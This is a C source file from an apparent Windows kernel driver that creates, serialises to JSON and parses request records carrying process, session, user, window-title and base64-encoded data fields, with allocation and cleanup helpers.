#include <inc/srequest.h>
#include <polarssl2/polarssl/base64.h>
#include <inc/klogger.h>
#include <inc/monitor.h>
#include <inc/string.h>
#include <inc/time.h>

#define MODULE_TAG 'sreq'
#define __SUBCOMPONENT__ "srequest"

int SRequestInit(PSREQUEST request)
{
	RtlZeroMemory(request, sizeof(SREQUEST));

	if (JsonMapInit(&request->map))
		return -1;

	request->pid = -1;
	request->tid = -1;
	request->sessionId = -1;
	request->dataSz = 0;
	request->type = SREQ_TYPE_UNDEFINED;
	request->status = SREQ_ERROR_UNDEFINED;

	return 0;
}

int SRequestSetPid(PSREQUEST request, int pid)
{
	return JsonMapSetLong(&request->map, "pid", pid);
}

int SRequestSetTid(PSREQUEST request, int tid)
{
	return JsonMapSetLong(&request->map, "tid", tid);
}

int SRequestSetSessionId(PSREQUEST request, int sessionId)
{
	return JsonMapSetLong(&request->map, "sessionId", sessionId);
}

int SRequestSetType(PSREQUEST request, int type)
{
	return JsonMapSetLong(&request->map, "type", type);
}


int SRequestSetStatus(PSREQUEST request, int status)
{
	return JsonMapSetLong(&request->map, "status", status);
}

int SRequestSetHostId(PSREQUEST request, char *hostId)
{
	return JsonMapSetString(&request->map, "hostId", hostId);
}

int SRequestSetClientId(PSREQUEST request, char *clientId)
{
	return JsonMapSetString(&request->map, "clientId", clientId);
}

int SRequestSetAuthId(PSREQUEST request, char *authId)
{
	return JsonMapSetString(&request->map, "authId", authId);
}


int SRequestSetProgramName(PSREQUEST request, char *programName)
{
	return JsonMapSetString(&request->map, "programName", programName);
}

int SRequestSetWindowTitle(PSREQUEST request, char *windowTitle)
{
	return JsonMapSetString(&request->map, "windowTitle", windowTitle);
}

int SRequestSetUserName(PSREQUEST request, char *userName)
{
	return JsonMapSetString(&request->map, "userName", userName);
}

int SRequestSetUserSid(PSREQUEST request, char *userSid)
{
	return JsonMapSetString(&request->map, "userSid", userSid);
}

int SRequestSetSystemTime(PSREQUEST request, char *systemTime)
{
	return JsonMapSetString(&request->map, "systemTime", systemTime);
}


int SRequestSetData(PSREQUEST request, char *data, size_t dataSize)
{
	char *encoded = NULL;
	size_t encodedSz = 0;
	int res = -1;

	if (base64_encode(encoded, &encodedSz, data, dataSize)) {
		encoded = ExAllocatePoolWithTag(NonPagedPool, encodedSz+1, MODULE_TAG);
		if (encoded == NULL) {
			KLog(LError, "alloc failed");
			res = -1;
			goto failed;
		}
		
		if (base64_encode(encoded, &encodedSz, data, dataSize)) {
			KLog(LError, "base64_encode failed");
			res = -1;
			goto failed;
		}

		encoded[encodedSz] = '\0';
	}

	if (JsonMapSetString(&request->map, "data", encoded)) {
		KLog(LError, "JsonMapSetString failed");
		res = -1;
		goto failed;
	}
	res = 0;

failed:
	if (encoded != NULL)
		ExFreePoolWithTag(encoded, MODULE_TAG);

	return res;
}

PSREQUEST SRequestCreate(int type)
{
	PSREQUEST request = NULL;
	char *hostId = MonitorGetInstance()->hostId;
	char *authId = MonitorGetInstance()->authId;
	char *clientId = MonitorGetInstance()->clientId;

	request = ExAllocatePoolWithTag(NonPagedPool, sizeof(SREQUEST), MODULE_TAG);
	if (request == NULL)
		return NULL;
	
	if (SRequestInit(request)) {
		ExFreePoolWithTag(request, MODULE_TAG);
		return NULL;
	}
	
	if (hostId != NULL)
		request->hostId = CRtlCopyStr(hostId);
	if (authId != NULL)
		request->authId = CRtlCopyStr(authId);
	if (clientId != NULL)
		request->clientId = CRtlCopyStr(clientId);

	request->type = type;
	request->systemTime = TimepQuerySystemTime(NULL);
	if (request->systemTime == NULL) {
		KLog(LError, "cant setup systemTime");
		SRequestDelete(request);
		request = NULL;
	}

	return request;
}


PSREQUEST SRequestCreateData(int type, size_t dataSz)
{
	PSREQUEST request = NULL;
	if (dataSz > SREQ_MAX_DATA_SZ)
		return NULL;

	request = SRequestCreate(type);
	if (request == NULL)
		return NULL;

	request->data = ExAllocatePoolWithTag(NonPagedPool, dataSz, MODULE_TAG);
	if (request->data == NULL) {
		SRequestDelete(request);
		return NULL;
	}
	RtlZeroMemory(request->data, dataSz);
	request->dataSz = dataSz;
	
	return request;
}

void SRequestRelease(PSREQUEST request)
{
	//KLog(LInfo, "release req=%p, data=%p", request, request->data);

	JsonMapRelease(&request->map);
	if (request->data != NULL) {
		ExFreePoolWithTag(request->data, MODULE_TAG);
		request->data = NULL;
	}
	
	if (request->clientId != NULL) {
		ExFreePoolWithTag(request->clientId, MODULE_TAG);
		request->clientId = NULL;
	}
	
	if (request->authId != NULL) {
		ExFreePoolWithTag(request->authId, MODULE_TAG);
		request->authId = NULL;
	}

	if (request->hostId != NULL) {
		ExFreePoolWithTag(request->hostId, MODULE_TAG);
		request->hostId = NULL;
	}

	if (request->userName != NULL) {
		ExFreePoolWithTag(request->userName, MODULE_TAG);
		request->userName = NULL;
	}

	if (request->userSid != NULL) {
		ExFreePoolWithTag(request->userSid, MODULE_TAG);
		request->userSid = NULL;
	}

	if (request->programName != NULL) {
		ExFreePoolWithTag(request->programName, MODULE_TAG);
		request->programName = NULL;
	}

	if (request->windowTitle != NULL) {
		ExFreePoolWithTag(request->windowTitle, MODULE_TAG);
		request->windowTitle = NULL;
	}

	if (request->systemTime != NULL) {
		ExFreePoolWithTag(request->systemTime, MODULE_TAG);
		request->systemTime = NULL;
	}

	request->pid = -1;
	request->tid = -1;
	request->sessionId = -1;

	request->dataSz = 0;
	request->type = SREQ_TYPE_UNDEFINED;
	request->status = SREQ_ERROR_UNDEFINED;
}

void SRequestDelete(PSREQUEST request)
{
	SRequestRelease(request);
	ExFreePoolWithTag(request, MODULE_TAG);
}

char *SRequestDumps(PSREQUEST request)
{

	if (SRequestSetPid(request, request->pid)) {
		KLog(LError, "cant setup pid");
		return NULL;
	}

	if (SRequestSetTid(request, request->tid)) {
		KLog(LError, "cant setup tid");
		return NULL;
	}

	if (SRequestSetSessionId(request, request->sessionId)) {
		KLog(LError, "cant setup sessionId");
		return NULL;
	}

	if (SRequestSetType(request, request->type)) {
		KLog(LError, "cant setup type");
		return NULL;
	}

	if (SRequestSetStatus(request, request->status)) {
		KLog(LError, "cant setup status");
		return NULL;
	}

	if (request->data != NULL)
		if (SRequestSetData(request, request->data, request->dataSz)) {
			KLog(LError, "cant setup data");
			return NULL;
		}

	if (request->authId != NULL)
		if (SRequestSetAuthId(request, request->authId)) {
			KLog(LError, "cant setup authId");
			return NULL;
		}

	if (request->hostId != NULL)
		if (SRequestSetHostId(request, request->hostId)) {
			KLog(LError, "cant setup hostId");
			return NULL;
		}	

	if (request->clientId != NULL)
		if (SRequestSetClientId(request, request->clientId)) {
			KLog(LError, "cant setup clientId");
			return NULL;
		}

	if (request->userName != NULL)
		if (SRequestSetUserName(request, request->userName)) {
			KLog(LError, "cant setup userName");
			return NULL;
		}

	if (request->userSid != NULL)
		if (SRequestSetUserSid(request, request->userSid)) {
			KLog(LError, "cant setup userSid");
			return NULL;
		}

	if (request->windowTitle != NULL)
		if (SRequestSetWindowTitle(request, request->windowTitle)) {
			KLog(LError, "cant setup windowTitle");
			return NULL;
		}

	if (request->programName != NULL)
		if (SRequestSetProgramName(request, request->programName)) {
			KLog(LError, "cant setup programName");
			return NULL;
		}

	if (request->systemTime != NULL)
		if (SRequestSetSystemTime(request, request->systemTime)) {
			KLog(LError, "cant setup systemTime");
			return NULL;
		}

	return JsonMapDumps(&request->map);
}

LONG SRequestGetStatus(PSREQUEST request)
{
	LONG status = SREQ_ERROR_UNDEFINED;

	JsonMapGetLong(&request->map, "status", &status);

	return status;
}

LONG SRequestGetType(PSREQUEST request)
{
	LONG type = SREQ_TYPE_UNDEFINED;

	JsonMapGetLong(&request->map, "type", &type);

	return type;
}


char *SRequestGetData(PSREQUEST request, size_t *dataSize)
{
	char *data = NULL;
	char *decoded = NULL;
	size_t decodedLen = 0;
	BOOLEAN bDecoded = FALSE;
	size_t dataLen = 0;

	*dataSize = 0;
	data = JsonMapGetString(&request->map, "data");
	if (data == NULL)
		return NULL;

	dataLen = strlen(data);
	if (base64_decode(decoded, &decodedLen, data, dataLen)) {
		decoded = ExAllocatePoolWithTag(NonPagedPool, decodedLen, MODULE_TAG);
		if (decoded == NULL)
			goto cleanup;

		if (base64_decode(decoded, &decodedLen, data, dataLen))
			goto cleanup;
		bDecoded = TRUE;
	}

cleanup:
	if (data != NULL)
		ExFreePool(data);

	if (bDecoded) {
		*dataSize = decodedLen;
		return decoded;
	}
	else {
		if (decoded != NULL)
			ExFreePoolWithTag(decoded, MODULE_TAG);
		return NULL;
	}
}

char * SRequestGetClientId(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "clientId");
}

char * SRequestGetHostId(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "hostId");
}

char * SRequestGetAuthId(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "authId");
}


char * SRequestGetUserSid(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "userSid");
}

char * SRequestGetUserName(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "userName");
}

char * SRequestGetProgramName(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "programName");
}

char * SRequestGetWindowTitle(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "windowTitle");
}

LONG SRequestGetPid(PSREQUEST request)
{
	LONG pid = -1;

	JsonMapGetLong(&request->map, "pid", &pid);
	
	return pid;
}

LONG SRequestGetTid(PSREQUEST request)
{
	LONG tid = -1;

	JsonMapGetLong(&request->map, "tid", &tid);

	return tid;
}

LONG SRequestGetSessionId(PSREQUEST request)
{
	LONG sessionId = -1;

	JsonMapGetLong(&request->map, "sessionId", &sessionId);

	return sessionId;
}

char * SRequestGetSystemTime(PSREQUEST request)
{
	return JsonMapGetString(&request->map, "systemTime");
}

PSREQUEST SRequestParse(char *json)
{
	PSREQUEST request = NULL;
	request = ExAllocatePoolWithTag(NonPagedPool, sizeof(SREQUEST), MODULE_TAG);
	if (request == NULL)
		return NULL;

	SRequestInit(request);
	if (JsonMapLoads(&request->map, json)) {
		SRequestDelete(request);
		return NULL;
	}

	request->type = SRequestGetType(request);
	request->status = SRequestGetStatus(request);
	request->data = SRequestGetData(request, &request->dataSz);
	
	request->authId = SRequestGetAuthId(request);
	request->hostId = SRequestGetHostId(request);
	request->clientId = SRequestGetClientId(request);

	request->pid = SRequestGetPid(request);
	request->tid = SRequestGetTid(request);
	request->sessionId = SRequestGetSessionId(request);

	request->userName = SRequestGetUserName(request);
	request->userSid = SRequestGetUserSid(request);
	request->programName = SRequestGetProgramName(request);
	request->windowTitle = SRequestGetWindowTitle(request);
	request->systemTime = SRequestGetSystemTime(request);

	return request;
}